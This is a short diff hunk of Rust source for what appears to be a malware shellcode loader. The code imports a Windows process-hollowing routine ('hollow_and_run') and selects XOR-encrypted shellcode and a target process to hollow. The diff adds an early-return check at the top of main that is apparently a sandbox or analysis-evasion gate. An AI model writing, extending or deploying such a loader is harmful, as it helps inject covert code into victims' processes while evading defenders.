@@ -11,8 +11,10 @@ mod rco_process_hollowing_windows;
 #[cfg(windows)]
 use rco_process_hollowing_windows::hollow_and_run;
 
-
 fn main() {
+    if rco_utils::pound_sand() {
+        return
+    }
     if cfg!(feature = "xor") {
         let (shellcode, target_process) = if cfg!(windows) {
             (rco_config::ENCRYPTED_WINDOWS_SHELLCODE, rco_config::ENCRYPTED_WINDOWS_HOLLOWING_TARGET)
